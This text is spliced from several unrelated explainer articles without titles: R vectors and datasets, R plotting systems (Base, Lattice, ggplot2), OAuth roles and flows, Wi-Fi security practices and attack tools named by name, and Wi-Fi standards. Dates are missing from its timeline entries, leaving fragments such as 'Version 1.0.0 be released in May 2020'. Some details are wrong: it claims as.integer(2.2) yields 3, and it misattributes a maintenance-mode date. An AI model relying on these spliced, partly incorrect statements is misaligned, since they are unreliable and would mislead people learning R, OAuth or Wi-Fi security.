Subsetting : We can select a subset of a vector by using integer vectors for indexing .
Eg .
` v[c(1,3,5 ) ] ` to select the first , third and fifth element ; ` v[1:3 ] ` to select the first three elements .
We can also use a logical vector to subset a vector .
Eg .
` v[v > 5 ] ` to select elements with a value greater than 5 .
Coercing : Since vectors contain elements of a single type , values are coerced to a single type if they are different .
Eg .
` v < - c(12L , 2.2 , TRUE ) ` coerces to doubles [ 12.0 , 2.2 , 1.0 ] ; ` v < - c(2.2 , TRUE , " Hi " ) ` coerces to characters [ " 2.2 " , " TRUE " , " Hi " ] .
Converting : may be called explicit coercing .
Convert the type .
Eg .
` as.integer(c(3 , 2.2 , TRUE ) ) ` becomes [ 3 , 3 , 1 ] ; ` as.numeric(c(2.2 , TRUE , " Hi " ) ) ` becomes [ 2.2 , NA , NA ] , where NA stands for " Not Available " .
Are there datasets to understand the different data structures ?
View in RStudio of ' rivers ' from package datasets .
Source : Devopedia 2020 .
R comes with many datasets for experimental analysis and learning .
These can be listed by typing ` data ( ) ` in the R console .
Details of each dataset can be obtained by using ` ?
` or ` help ` .
For example , for help on " rivers " dataset type either ?
rivers ` or ` help(rivers ) ` .
It 's been said that datasets " mtcars " , " iris " , " ToothGrowth " , " PlantGrowth " and " USArrests " are commonly used by researchers .
An example of a vector is the " rivers " dataset .
An example of a vector with names given to each observation is " precip " .
There are plenty of examples for data.frame : " airquality " , " mtcars " , " iris " .
An example of a list in the " state.center " dataset .
In " CO2 " , the " Plant " variable is an ordered factor whereas the " Type " variable is an unordered factor .
Dataset " Titanic " is of class ` table ` , which is a type of array .
This data structure records counts of combinations of factor levels .
An object can belong to multiple classes .
As an example , try ` class(CO2 ) ` and ` str(CO2 ) ` .
It 's a data.frame but also belongs to other classes .
Can you give examples of data structures beyond the core ones given by R ?
Developers can create their own data structures that can build on top of the basic ones .
One popular one is called data.table , which is based on data.frame .
It offers a simplified and consistent syntax for handling data .
Another example is tibble , which retains the effective parts of the data.frame and does less work so that developers can catch problems early on .
If you want to display data frames in HTML with conditional formatting ( like in Microsoft Excel ) , formattable is a suitable package to use .
Another package named dplyr is n't exactly a data structure .
Rather , it offers a number of functions for manipulating data .
It comes as part of the tidyverse collection of R packages targetted towards data science .
Version 1.0 of data.table has been released .
The R version 3.0.0 has been released .
This version supports vectors longer than ` 2 ^ 31 - 1 ` elements .
This applies to raw , logical , integer , double , complex and character vectors , as well as lists .
Elements of character vectors are limited to ` 2 ^ 31 - 1 ` bytes .
Hadley Wickam releases version 0.1 of dplyr , which is meant " to provide a consistent set of verbs that help you solve the most common data manipulation challenges .
" Version 1.0.0 be released in May 2020 .
The R version 4.0.0 has been released .
This version uses ` stringsAsFactors = FALSE ` as default when reading tabular data via ` data.frame ( ) ` or ` read.table ( ) ` .
Previous versions used to convert strings to factors by default .
Data visualization is an important task for a statistician , data analyst or data scientist .
It 's an essential part of exploratory data analysis .
R has more than one plotting system to do this visualization .
Each has a different syntax .
R programmers prefer to master one of them and at least become familiar with the rest .
Default R packages support only 2D plots .
However , third - party packages are available for 3D and interactive plots .
Plots produced can be exposed via web interfaces .
R also integrates well with many third - party visualization and analysis software .
Which are the plotting systems in R ?
Roger D. Peng explains the different plotting systems in R. Source : Peng 2016a .
R has three plotting systems : Base : We start with a blank canvas and start adding elements to it one by one .
We can create the main plot and then add labels , axes , lines , and so on .
Base plots are said to be intuitive since the process of creating them closely mirrors the thought process .
Once something 's in the plot , we ca n't go back and correct it .
Lattice : A plot is created with a single function call .
Margins and spacing are set automatically since the entire plot is known when the function is called .
Lattice is good for multivariate plots since it 's easy to create many subplots .
ggplot2 : This is a cross between the Base and Lattice systems .
Like Lattice , many things are automatically set , but like Base , it allows us to add to the plot after it 's created .
Lots of customizations are possible .
Which of the R plotting systems should I learn ?
Users on Quora have commented that base plots are good for exploratory data analysis .
The idea is to plot quickly without thinking about neatness .
But if you need to create plots for publications , ggplot2 is preferred .
Lattice plots are not that popular .
Nathan Yau has compared both Base and ggplot2 .
He uses only Base .
Jeff Leek has echoed a similar sentiment that he prefers using Base for exploratory data analysis .
Defaults available in ggplot2 can produce great plots with minimal code but can fool students into thinking that they 're production ready .
Against the Base plot , David Robinson argues that ggplot2 's pretty plots should be preferred over Base 's ugly ones , even for exploratory data analysis .
Creating legends , grouped lines and facets is cumbersome in the Base system .
With ggplot2 , we do n't need loops , grid statements or if statements because Base plotting is imperative , it ’s about what you do .
ggplot2 plotting is declarative , it ’s about what your graph is .
We should note that the ` qplot ` command of ggplot2 offers a simplified syntax that 's similar to the Base system .
Hence , learning only the ggplot2 system thoroughly may be enough .
How can I make my R plots interactive ?
Interactive plots enable users to zoom into areas of interest , highlight important data points or hide irrelevant data points .
Extra information can be shown via tooltips when users hover the mouse on specific data points .
With the ` plotly ` package , we can make ggplot2 plots interactive .
This becomes an easy learning path for those already familiar with ggplot2 .
However , ` plotly ` can also be used on its own without ggplot2 .
An alternative to this is the ` highcharter ` package that wraps over HighCharts JavaScript library .
Shiny from RStudio enables interaction via a web interface .
It supports both the Base and ggplot2 systems .
Called Shiny apps , they can be enhanced with ` shinythemes ` , ` htmlwidgets ` and JavaScript .
To interact across widgets , add - on ` crosstalk ` can be used .
D3 is an influential charting library for the JavaScript and web world .
Similar plots can be created in R without using any JavaScript .
Examples of this include rCharts , d3scatter and networkD3 .
What packages enable 3D plots in R ?
The Base system has the function ` persp ` that draws perspective views of a surface over the x - y plane .
The command ` demo(persp ) ` will show what 's possible .
Other R packages for 3D visualization include ` plot3D ` , ` scatter3d ` , ` scatterplot3d ` , ` rgl ` .
Packages ` rgl ` and ` scatter3d ` are interactive whereas ` scatterplot3d ` is non - interactive .
There 's also an extension of ` plot3D ` called ` plot3Drgl ` , which is based on ` rgl ` .
Plotly 's R package called ` plotly ` can do interactive 3D plots .
Which third - party data visualization and analysis software integrates well with R ?
There is plenty of data visualization and analysis software .
Many of these are now able to integrate with R. Plotly integrates well with ggplot2 and Shiny , but can also do plots without either of them .
Highcharts integration is available via ` highcharter ` , which uses ` htmlwidgets ` , and works well with Shiny .
Microsoft 's Power BI can run integrate with R , run R script and display R plots within its Power BI Desktop software .
MicroStrategy has its own visualizations , but it can integrate with R for scripting and data analysis .
Something similar can be done with Tableau and QlikView .
Could you list some useful plot commands in the Base system ?
A selection of base plots .
Source : Johnston 2013 .
You can obtain a complete list by typing ` library(help = " graphics " ) ` on the R console .
Here we give a selection based on R version 3.5.0 : ` assocplot ` , ` barplot ` , ` boxplot ` , ` cdplot ` , ` coplot ` , ` dotchart ` , ` fourfoldplot ` , ` hist ` , ` matplot ` , ` mosaicplot ` , ` pie ` , ` plot ` , ` spineplot ` , ` stem ` , ` sunflowerplot ` .
Once the main plot is generated , other functions can be called to annotate and customize : ` abline ` , ` axis ` , ` box ` , ` grid ` , ` legend ` , ` lines ` , ` mtext ` , ` points ` , ` rug ` , ` text ` , ` title ` .
To generate a plot containing subplots , ` par ` and ` layout ` can be used .
To customize colours , lines , background , axe orientation and margins , ` par ` is useful .
Could you list some useful plot commands in the Lattice system ?
You can obtain a complete list by typing ` library(help = " lattice " ) ` on the R console .
Here we give a selection based on version v0.20 - 35 .
Bivariate plots can be generated using ` xyplot ` , ` dotplot ` , ` barchart ` , ` stripplot ` , ` bwplot ` .
For 3D and wireframes , use ` cloud ` and ` wireframe ` respectively .
For histograms and density plots , use ` histogram ` and ` densityplot ` respectively .
For level plots and contour plots , use ` levelplot ` and ` contourplot ` respectively .
In any of the Lattice plots , panels can be created to handle multivariate data .
For example , a scatterplot comparing height and age can be done in separate panels for males and females .
Functions that enable panels are many and these are typically named with the prefix ` panel .
` .
These panel functions are implicitly called via the syntax ` y ~ x|a*b ` , where ` a ` and ` b ` are the variables by which panels are made .
For example , ` xyplot(mpg ~ wt|cyl*gear , data = mtcars ) ` will give a scatterplot of cyl*gear number of panels .
Could you list some useful plot commands in the ggplot2 system ?
A selection of geom _ * commands used in ggplot2 .
Source : Ginolhac et al .
2017 , slide 24 .
You can obtain a complete list by typing ` library(help = " ggplot2 " ) ` on the R console .
Here we give a selection based on version 2.2.1 .
There are two main plotting functions : ` ggplot ` : This creates a new blank plot that must be completed by calling other helper functions .
` qplot ` : Also called Quick Plot , this offers a simplified syntax compared to ` ggplot ` .
This is an ideal starting point for those familiar with R 's Base plots .
For complex plots , ` ggplot ` may be required .
When using ` ggplot ` , the following functions are needed to complete the plot : ` geom _ * ` : These functions specify what type of geometric objects should be plotted .
Examples include ` geom_point ` , ` geom_path ` , ` geom_bar ` , ` geom_boxplot ` , and many more .
Data , if specified here , will override data specified in ` ggplot ` .
` aes ` : This specifies the aesthetics , the mapping of variables to x and y axes .
For data points , we can select shape , colour and size .
This can be done when calling ` ggplot ` or ` geom _ * ` functions .
Aesthetics specified in individual ` geom _ * ` calls will override those specified in ` ggplot ` .
What 's the technique of creating a plot with ggplot2 ?
A plot in ggplot2 is created as a combination of layers .
Source : Skill Gaze 2017 .
ggplot2 is an implementation of a modified Grammar of Graphics , which was first proposed by Leland Wilkinson in 1999 and later revised in 2005 .
It was created by Hadley Wickham , who calls it the Layered Grammar of Graphics .
The concept of layering is used ; that is , ggplot2 combines multiple layers of visualizations to make a single plot .
For example , ` ggplot ` will create the plot while each call to ` geom _ * ` creates a layer of geometric objects .
Coordinates and facets are specified .
Further calls can set the theme , add annotations , adjust the scale , and so on .
When all these are combined , we get the complete plot .
To generalize the concept , Wickham mentions the following components for a typical plot : Default dataset and mappings from variables to aesthetics .
Layers to specify geometric objects , statistical transformations and positions .
Scale for each aesthetic map .
Coordinate system .
Facet specification .
What customizations can I do with ggplot2 ?
Anatomy of a plot in ggplot2 .
Source : Sape Research Group 2018 .
Without being exhaustive , the following customizations in ggplot2 are possible : Annotations : With ` annotate ` , text , shaded rectangles , lines , labels , etc .
can be added .
Coordinates : With ` coord _ * ` functions , we can select coordinates ( Cartesian vs Polar ) , transform coordinates , flip x and y axes , and so on .
Facets : These allow visualization of multivariate data .
function with the prefix ` facet _ * ` enables this .
The syntax ` a ~ .
` places the panels vertically ; ` .
~ a ` places the panels horizontally , side by side .
Themes : Themes control colours , sizes , positions , borders and margins of background , panels , axe titles , axe ticks , axe labels , and so on .
Two themes are available : ` theme_grey ( ) ` ( default ) and ` theme_bw ( ) ` ( sets background to white ) .
You can create your own custom themes .
Scale : Scale for the axes can be customized using many functions : ` discrete_scale ` , ` continuous_scale ` , ` guides ` , ` lims ` , ` scale _ * ` ( multiple functions ) , and so on .
Position : Functions ` position _ * ` adjust the position of geoms .
Statistics : Functions that produce statistical summaries before generating geoms .
What are ggplot2 extensions ?
Third - party packages add extra functionality to the ggplot2 plotting system .
These are called ggplot2 extensions and they are tracked at ggplot2-exts.org .
In May 2018 , this site listed a gallery of 40 extensions .
As a sample , these include radar charts , animated charts , time series charts , alluvial diagrams , directed acyclic graphs , and more .
Notably , ` ggedit ` allows users to interactively edit the layers , scales and themes .
Incidentally , ` latticeExtra ` extends the capabilities of the Lattice system .
Although R started in 1993 , the first public release 1.0.0 was released in February 2000 .
The base plotting system is part of this release .
Deepayan Sarkar starts working on the Lattice system .
He 's inspired by Trellis Graphics that was first proposed by Bill Cleveland in 1993 and subsequently implemented in S / S+ languages .
However , the equivalent was missing in R. Sarkar uses ` grid ` add - on package of Paul Murrell ( 2002 ) to develop Lattice .
Leland Wilkinson publishes the second edition of his book titled The Grammar of Graphics .
It was first published in 1999 .
This book inspires Hadley Wickham to create ` ggplot ` and ` ggplot2 ` .
Hadley Wickham releases ` ggplot ` .
The final release 0.4.2 of this package was released in October 2008 .
Subsequently , it 's replaced with ` ggplot2 ` .
Hadley Wickham releases ` ggplot2 ` version 0.5 .
In February 2014 , the package goes into maintenance mode ( no new features ) .
Version 2.2.1 of the package was released in December 2016 .
In a five - year span , 2012 - 2017 , the package is downloaded 10 million times .
In May 2017 alone , it got 400,000 downloads .
For interactive web applications with R , including plots , Shiny v0.1.2 has been released .
Version v1.0.0 was released in 2017 .
Version 1.0 of the ` plot3D ` package has been released .
OAuth logo .
Source : Messina 2007 .
OAuth is an authorization framework that allows a third - party application to access private resources of a user when those resources are stored as part of another web service .
For example , a user has an account with GMail or Facebook .
The user visits a gaming platform that requests access to the user 's basic profile on GMail or Facebook .
OAuth allows the user to authorize this gaming platform to access the profile .
The strength of OAuth lies in the fact that the user 's credentials ( username , password ) are not shared with third - party services .
Such credentials are used only between the resource owner ( user ) and the authorization server .
Thus , OAuth is for authorization , not authentication .
In addition , the user can at any point revoke this authorization .
Why was OAuth invented in the first place ?
Back in 2006 , Blaine Cook was investigating a means to grant third - party applications access to the Twitter API via delegated authentication .
He considered using OpenID for this purpose but found it unsuitable .
The idea was that users should not be required to share their usernames and passwords with third - party applications .
There were , at the time , other frameworks , but they were not open standards : Flickr Auth , Google AuthSub and Yahoo !
BBAuth .
OAuth was thus invented as an open framework for authorization without even specifying the methods of authentication .
In fact , it 's been said that OAuth was written by studying and adopting the best practices from these early proprietary methods .
What are the available OAuth roles ?
Four roles are defined in the standard : The Client is the application requiring access to protected resources .
The resource owner is the entity owning the resource .
It 's usually a person called an end - user .
The resource owner gives authorization to clients to access protected resources .
The Authorization Server does authentication of the resource owner and handles authorization grants coming from the client .
It gives out access tokens .
The Resource Server manages protected resources based on access tokens presented by clients .
As an example , a gaming application ( client ) requires the profile of a gamer ( resource owner ) from her GMail account .
Access to the gamer 's GMail profile ( protected resource ) is authorized by the gamer .
The GMail service encapsulates both the authorization and resource servers .
Implementations have the choice to combine authorization and resource servers into a single server , but they might just as well be different servers .
Could you briefly describe the protocol flow ?
Abstract protocol flow .
Source : Anicas 2014 .
OAuth specifies different authorization grant types , each of which has its own flow .
We can summarize the flow as made up of these steps : obtaining authorization from the user , exchanging this authorization for an access token , using the token to access protected resources .
Delving into the details , OAuth flows can be related to the level of confidentiality involved .
If the client is a web application , then it 's a confidential client since the client ID and secret key are kept on the client server .
If the client is a user - agent ( web browser ) or a native application running on a device with the resource owner , then it 's a public client .
From this perspective , we can look at flows in this manner : Confidential : client credentials flow , password flow , authorization code flow , Public : implicit flow , password flow , authorization code flow . Though it 's more common to talk about grant types these days , the terms two - legged flow and three - legged flow are still in use .
With the former , the resource owner is not involved , as in client credentials flow .
With the latter , all three ( resource owner , client and authorization server ) are involved .
What essential data are exchanged for authorization ?
Every client must have a client ID and a client secret key .
Sometimes these are called consumer ID and consumer secret keys .
The client will also have a redirect URI .
This is the endpoint where the authorization code will be received by the client and subsequently exchanged for an access token .
This tuple of client ID , secret key and redirect URI is generated or configured in advance on the authorization server , which is called client registration .
The Authorization will fail if these do not match .
An access token is the one that 's presented to the resource server after a successful authorization .
An access token simply allows access to protected resources .
The resource owner may choose at any point to revoke access to the authorization server .
A token can also expire , in which case the client can request a token refresh if a refresh is allowed .
In the case of password flow , authorization will be based on the resource owner 's username and password .
From a security standpoint , this flow makes sense only if the resource owner trusts the client enough to give out her username and password .
Which are the endpoints defined in OAuth ?
Use of endpoints as part of authorization code flow .
Source : Jenkov 2014 .
An endpoint is nothing more than a URI .
The standard defines the following endpoints though extra endpoints could be added : Authorization endpoint : Located at the authorization server , this is used by the client to obtain authorization from the resource owner .
The resource owner is redirected to the authorization server via a user - agent ( typically the web browser ) .
Redirection endpoint : Located at the client , this is used by the authorization server to return responses containing authorization credentials to the client via the user - agent .
Token endpoint : Located at the authorization server , this is used by the client to exchange an authorization grant for an access token .
The typical call flow , at least for authorization code grant type , invokes the endpoints in the order of Authorization , Redirection and Token .
In the case of implicit grant type , the order is Authorization and Redirection endpoints .
The Token endpoint is not involved since the Authorization endpoint implicitly returns an access token .
Are there open - source implementations of OAuth ?
OAuthLib is an open source implementation in Python .
Hydra is an implementation in Go .
It covers OAuth and OpenID Connect .
In Java , we have Spring Security OAuth and Apache Oltu .
The latter includes OAuth , JWT , JWS and OpenID Connect .
From Google , there 's Google OAuth Client Library for Java .
Anvil Connect supports OAuth , JWT and OpenID Connect .
We have to keep in mind that these implementations may be specific to the client or server or both .
How would you compare OAuth with OpenID Connect and SAML ?
OpenID Connect ( OIDC ) is an identity and authentication layer that uses OAuth 2.0 as the base layer for authorization .
As an ID token , it uses a signed JSON Web Token ( JWT ) , also called JSON Web Signature ( JWS ) .
It uses REST / JSON message flows .
OIDC is best suited for single sign - on apps , while OAuth is best for API authorization .
In some cases , OAuth 2.0 may be used by implementors as a means of pseudo - authentication , by assuming the entity owning the access token is also the resource owner .
Eran Hammer - Lahav summarized the difference between OpenID and OAuth nicely ( authentication vs authorization ) . While OpenID is all about using a single identity to sign into many sites , OAuth is about giving access to your stuff without sharing your identity at all .
The Security Assertion Markup Language ( SAML ) offers both authentication and authorization .
What is called a token in OpenID and OAuth terminology , is called an assertion in SAML .
Assertions ( structured in XML ) contain statements that fulfil the purpose of authentication and authorization .
SAML may not be suited for mobile apps .
As a simplification , we could see OIDC as a combination of OAuth and SAML .
What are OAuth extensions ?
OAuth allows extensibility in terms of authorization grant types , access token types , and more .
This will allow OAuth to interwork with other protocol frameworks .
Website OAuth.net considers three RFCs as part of the OAuth 2.0 Core : 6749 , 6750 , 6819 .
It then lists a number of OAuth extensions .
Likewise , a search on IETF Datatracker yields all documents that pertain to OAuth .
How does OAuth 1.x compare against OAuth 2.0 ?
OAuth 2.0 uses SSL / TLS for security .
With OAuth 1.x , each request had to be secured by the OAuth implementation , which was cumbersome .
In this sense , OAuth 2 is simpler .
OAuth 1.0 suffered from session fixation attacks .
Such a flaw does not exist in OAuth 1.0a and above .
OAuth 2.0 uses grant types to define different flows or use cases .
OAuth 1.x worked well for server - side applications but not so well for browser web apps or native apps .
OAuth 2.0 is not compatible with OAuth 1.0 or 1.0a ( sometimes called 1.1 ) .
A deeper technical comparison of versions 1.x and 2.0 is available at OAuth.com .
Controversially , it 's been mentioned that OAuth 2 is " more complex , less interoperable , less useful , more incomplete , and most importantly , less secure .
" What are the problems with OAuth ?
One of OAuth 's original creators , Eran Hammer , claimed that OAuth 2 is more complex and less useful than its earlier version .
It 's been " designed - by - committee " with an enterprise focus .
He claims OAuth should have been a protocol rather than a framework .
The end result is too much flexibility and very few interoperable implementations .
In terms of security risks , one analysis showed how developers can mistakenly use OAuth for the purpose of user authentication .
In 2014 , the " Covert Redirect " vulnerability was discovered where phishing along with URL redirection can be used to gain access to protected resources .
This can be solved by having a whitelist of redirected URLs on the authorization server .
In 2016 , researchers discovered that man - in - the - middle attacks were possible with OAuth and OpenID Connect .
Because OAuth 2.0 uses TLS , it does n't support signature , encryption , channel binding and client verification .
Blaine Cook started looking at OpenID but wants a better delegated authentication method for the Twitter API .
OpenAuth Google group started , but when AOL released their own protocol named OpenAuth , this group changed its name to OAuth in May 2007 .
The OAuth Core 1.0 final draft has been released .
The OAuth Working Group was created at IETF .
One of the creators of OAuth later commented that bringing OAuth into the IETF was a mistake .
OAuth Core 1.0 Revision A is released .
It fixes the session fixation attack .
IETF releases RFC 5849 that replaces OAuth Core 1.0 Revision A. OAuth 2.0 is released by IETF as RFC 6749 .
Wi - Fi security has been a concern due to the wireless nature of access .
With wired networks such as Ethernet , a hacker needs physical access to the equipment .
With Wi - Fi , attacks can be launched in a vicinity where the signal can be picked up .
It 's therefore important to not only control who is allowed to get into a Wi - Fi network but also protect all data that 's being exchanged over the network .
With the coming of IoT , Wi - Fi security is likely to be more important than ever before .
Attacks on Wi - Fi can be passive , such as sniffing the radio channels to pick up useful information .
It can be more active , such as a rogue device impersonating as an authentic access point or client .
Wi - Fi security needs to address all these aspects .
What does security mean in the context of Wi - Fi ?
Wi - Fi security can be seen in two aspects : Authentication : This controls who is allowed to log into the network .
Wi - Fi clients have to provide the right credentials to connect to an access point ( AP ) .
This is usually a password , but more sophisticated methods are possible using Extensible Authentication Protocol ( EAP ) and IEEE 802.1x .
A Wi - Fi password is also called a passphrase or Network Security Key .
From the perspective of authentication , a client is also called a supplicant .
Encryption : Data is encrypted so that others can not read it .
Authentication and encryption are sometimes called " security " and " privacy " respectively .
These are implemented at the MAC layer , meaning that protection is only between the client and the access point .
What 's also important is end - to - end security .
Keeping your data and network secure usually involves more than just Wi - Fi .
Security protocols can be employed in different layers .
IPsec protects data at the IP layer .
TLS and SSL protect data at the transport / session / application layers .
SSH protects data at the application layer .
For browsing webpages in a secure manner , HTTPS relies on SSL / TLS .
In addition , firewalls , VPNs and anti - virus software can be used .
What steps can I take to secure my Wi - Fi network ?
Screenshot of Linksys router highlighting that WPA ( or WPA2 ) shared key must be non - trivial .
Source : Linksys WRT54 G Firmware , 2012 .
The following are best practices for a secure Wi - Fi network : A Wi - Fi router or access point will come with a default SSID and password .
Change these to non - default values .
Use a strong password .
Periodically change the network password .
Enable encryption .
The use of WPA2-AES is recommended .
Use a Wi - Fi CERTIFIED product since it 's certified for WPA2 support .
Since WPS is a security risk , disable this feature completely .
Router manufacturers often release updates including security enhancements or patches .
Update your router with the latest firmware releases .
Allow administrative web access to your router via HTTPS and block HTTP access .
Disable wireless admin access .
In addition , disable remote management , so that settings can be changed only by someone with physical access to the router .
Change admin credentials to non - default values .
Use a strong admin password .
Restrict the signal to within your house by using anti - Wi - Fi paint .
What are some myths about Wi - Fi security ?
Here are some things you can do , but these are not going to make your network more secure since tools exist to overcome them : Disable broadcast of SSID to prevent casual folks from trying to connect to your access point .
Configure access point to allow connections from a whitelist of known clients .
This is usually specified with the client 's MAC address .
Disable DHCP and allocate IP addresses to a limited range .
Reduce the range of the Wi - Fi signal but a hacker will probably use a higher gain antenna .
What precautions can I take to secure my Wi - Fi client and its data ?
Staying safe on public Wi - Fi .
Source : RE - BiT , 2015 .
The following are recommended : Do n't allow automatic connections to open Wi - Fi access points .
These access points may be potentially dangerous .
In other words , enable WPA2 security .
Or configure the client to prompt the user for approval before connecting .
Disable clients from sending out probes looking for an available access point .
If a client has highly sensitive data , you can allow it to connect only to a whitelist of access points .
Disable sharing of your connection to other devices nearby , particularly when using a public AP .
Use a VPN so that data is always encrypted before it leaves your device .
This way , a rogue AP will be rendered useless even if the Wi - Fi connection has been compromised .
Which security protocol should I choose ?
Comparing different Wi - Fi security protocols .
Source : Brooks , 2007 , slide 10 .
You should use the latest standards , WPA3-Personal or WPA3-Enterprise .
On older devices , use Wi - Fi Protected Access II ( WPA2 ) together with Advanced Encryption Standard ( AES ) .
For home or personal use , use WPA2-PSK , where a PSK implies a pre - shared key ( usually called password ) .
WPA2-Enterprise is used when the network supports additional methods of authentication .
The Wi - Fi Alliance has branded IEEE 802.11i as WPA2 .
WPA may be seen as a partial implementation of IEEE 802.11i .
Historically , Wi - Fi security protocols include WEP ( Wired Equivalent Privacy ) , WPA , WPA2 and WPS ( Wi - Fi Protected Setup ) .
WEP and WPS are no longer secure .
WPA was designed to replace WEP on old device hardware .
Encryption methods and integrity checks are also important .
WEP uses RC4 stream cipher for encryption and CRC32 for integrity check .
WPA uses RC4 ( or AES if supported by device ) but enhances it with Temporal Key Integrity Protocol ( TKIP ) ; and it uses a 64-bit Message Integrity Check ( MIC ) named MICHAEL .
WPA2 uses AES , which is secure .
More accurately , an AES - standard named CCMP is used .
The use of WPA and TKIP can limit the performance of your router .
There are known attacks against TKIP .
Are there any known vulnerabilities with WPA2 ?
In October 2017 , " key reinstallation attacks ( KRACKs ) " were used successfully to read sensitive information previously assumed to be encrypted .
This was not merely an implementation bug but a flaw in the WPA protocol itself .
When a client wants to join a Wi - Fi network , it does a handshake that includes initialization of cryptographic keys .
In this attack , the client can be tricked to reuse existing keys as well as reset counters to their initial values .
KRACK may include arbitrary packet decryption and injection , TCP connection hijacking , HTTP content injection , or the replay of unicast and group - addressed frames .
Vendors are known to provide updated firmware that fixes the KRACK vulnerability .
WPA3 replaces WPA2 as the latest Wi - Fi security standard .
Cisco has stated that they will offer WPA3 on older devices via a firmware upgrade .
What is WPS and should I use it ?
Wi - Fi Protected Setup ( WPS ) was introduced into the Wi - Fi standard to simplify the setup process .
Rather than entering long passwords , an 8-digit pin is used to connect a client to the access point .
WPS has a few different ways that require either physical or admin access to the devices .
The 8-digit pin is usually mentioned on the device 's hardware , be it a client or router or both .
The use of WPS is not recommended .
Vulnerabilities in WPS were discovered in 2011 and a brute force attack is enough .
A simple explanation of how this attack works is given by Paul Ducklin .
In one case , the attack succeeded in just six hours .
Can you name some well - known attacks on or using Wi - Fi networks ?
In 2003 , the open Wi - Fi network of Lowe 's became the entry point for two hackers .
They accessed servers across seven US states and crashed a PoS system .
In 2004 , BJ 's was hacked and credit card numbers were stolen .
This was due to unencrypted networks and use of default credentials .
BJ 's incurred legal costs of about $ 10 million .
In 2005 , GE Money in Finland lost 200,000 Euros due to unprotected Wi - Fi .
In 2007 , hackers exploited WEP 's weaknesses and stole credit card numbers from Marshalls department store in St. Paul , Minnesota .
What tools or products exist to snoop a Wi - Fi network or audit its security ?
For scanning the airwaves for 802.11x traffic , we have Wireshark , inSSIDer , Kismet , Pwnie Express Pwn Pro , and Netstumbler .
An Airsnarf is one tool to impersonate an access point .
Airpwn can be used to inject packets at the access point and fool the client .
Airsnort and Aircrack are for attacking WEP .
To simply jam the radio spectrum , Wave Bubble is one device .
Aircrack and coWPAtty can be used to attack WPA .
To spoof a MAC address , Nmap and MAC Shift are handy .
To know if there 's unauthorized access to your network , AirSnare is useful .
Default passwords for well - known products are listed publicly .
WEP is standardized as the security protocol for Wi - Fi .
Berkeley researchers discovered vulnerabilities in WEP .
WPA is ratified by the Wi - Fi Alliance as a replacement for the vulnerable WEP .
Due to WPA 's weak integrity check using MICHAEL , WPA2 came out .
It 's a complete implementation of the IEEE 802.11i standard .
The Wi - Fi Alliance requires that all devices must be WPA2 certified in order to use the Wi - Fi trademark .
WPS has been officially launched by Wi - Fi Alliance .
WPS are found to be vulnerable to brute force attacks .
There are design flaws in WPS and also implementation flaws in many popular Wi - Fi routers .
Wi - Fi Alliance releases WPA3 that aims to " simplify Wi - Fi security , enable more robust authentication , and deliver increased cryptographic strength for highly sensitive data markets " .
This is welcome news given that WPA2 was compromised in October 2017 .
Researchers discovered vulnerabilities in WPA3 's Dragonfly key exchange .
These vulnerabilities are collectively termed Dragonblood .
Wi - Fi Alliance announced an update to the WPA3 to fix these vulnerabilities .
Vendors can push this to existing devices via a software update .
This logo represents a Wi - Fi signal .
Source : PngFind 2020 .
Wi - Fi is a technology for wireless local area networking with devices based on the IEEE 802.11 standards .
User equipment ( laptop / mobile ) uses a wireless adapter to translate data into a radio signal and transmit that signal using an antenna .
At the receiving end , a wireless router converts radio waves back into data and then sends it to the Internet using a physical connection .
Wi - Fi networks either operate in infrastructure mode or ad hoc mode .
Wi - Fi networks typically operate on unlicensed 2.4 , 5 and 60 GHz radio bands .
Data rates up to 20 Gbps are possible in the 60 GHz band .
The range of a Wi - Fi network varies anywhere from a few metres ( point - to - multipoint ) to many kilometres ( point - to - point with directional antennas ) .
What are the roles of IEEE and the Wi - Fi Alliance in Wi - Fi Technology ?
IEEE 802.11 is the Working Group of the Institute of Electrical and Electronics Engineers ( IEEE ) that deals with Local Area Networks ( LANs ) , and its main role is to develop technical specifications for WLAN implementation .
The Wi - Fi Alliance was formed to ensure interoperability testing and certification for the rapidly emerging 802.11 world .
This gives consumers the confidence a device from one vendor will work with another from another vendor , as long as they are Wi - Fi certified .
It developed Wi - Fi Protected Access ( WPA ) in response to the poorer security of WEP .
While IEEE standards have technology - centric names , the Wi - Fi Alliance has come up with a more consumer - friendly name .
For example , IEEE 802.11ax is named Wi - Fi 6 .
What 's the difference between WiFi and WLAN ?
A WLAN ( Wireless Local Area Network ) is a LAN to which a user ( Station ) can connect through a wireless connection .
However , Wi - Fi is a type of WLAN that adheres to IEEE 802.11x specifications .
What are the different existing 802.11x standards ?
< tr > < th>802.11 protocol</th > < th > Frequency ( GHz)</th > < th > Bandwidth ( MHz)</th > < th > Data Rate ( Mbit / s)</th > < th > Description</th > < /tr > < tr > < td>802.11a</td > < td>5</td > < td>20</td > < td>54</td></td > < td > Uses data link layer protocol and frame format as the original standard , but an OFDM - based air interface .
< /td > < /tr > < tr > < td>802.11b</td > < td>2.4</td > < td>22</td > < td>11</td > < td > Uses the same media access method defined in the original IEEE standard .
< /td > < /tr > < tr > < td>802.11g</td > < td>2.4</td > < td>20</td > < td>54</td > < td > Uses OFDM - based transmission and operates at physical layer .
< /td > < /tr > < tr > < td>802.11n</td > < td>2.4/5</td > < td>20 , 40</td > < td>600</td > < td > Provides multiple - input multiple - output antennas .
< /td > < /tr > < tr > < td>802.11ac</td > < td>5</td > < td>20 , 40 , 80 , 160</td > < td>3467</td > < td > Release incrementally as Wave 1 and Wave 2 .
More spatial streams , higher - order modulation and the addition of multi - user MIMO .
< /td > < /tr > < tr > < td>802.11ad</td > < td>60</td > < td>2106</td > < td>6757</td > < td > An amendment that defines a new physical layer to operate in the 60 GHz millimeter wave spectrum .
< /td > < /tr > < tr > < td>802.11ax</td > < td>2.4/5</td > < td>20 , 40 , 80 , 80 + 80</td > < td>9608</td > < td > Successor to 802.11ac meant to increase the efficiency of WLAN networks.</td > < /tr > < tr > < td>802.11aj</td > < td>45/60</td > < td></td > < td></td > < td > A rebranding of 802.11ad for China .
< /td > < /tr > < tr > < td>802.11ay</td > < td>60</td > < td>8000</td > < td>20000</td > < td > Extension of the existing 11ad , aimed at extending the throughput , range and use cases .
< /td > < /tr > Which are the types of Wi - Fi products available on the market ?
Wi - Fi products with a number of features are getting released on a regular basis .
Here 's a short list of Wi - Fi product types : Wi - Fi Access Point ( AP ) - Used to connect other devices in Wi - Fi Infrastructure mode .
All User Equipment will get access to the Internet via Access Point .
Wi - Fi Analyzer - To Test and diagnose wireless performance issues such as throughput , connectivity , device conflict and single multipath .
Wi - Fi Autodoc - Autodoc is the foremost software to generate a comprehensive report from firewall configuration files .
